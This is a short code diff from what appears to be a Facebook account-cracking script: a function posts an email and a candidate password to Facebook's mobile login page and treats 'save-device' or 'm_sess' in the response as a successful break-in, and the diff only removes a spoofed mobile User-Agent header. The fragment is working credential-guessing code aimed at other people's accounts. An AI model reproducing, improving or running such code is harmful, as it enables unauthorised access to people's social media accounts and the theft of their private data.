@@ -171,8 +171,8 @@ def main(arg):
         try:
                 url='https://mbasic.facebook.com/login'
                 dt={'email':arg,'pass':pas,'login':'submit'}
-                head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
-                req=requests.post(url,data=dt,headers=head)
+                #head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
+                req=requests.post(url,data=dt) #,headers=head)
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
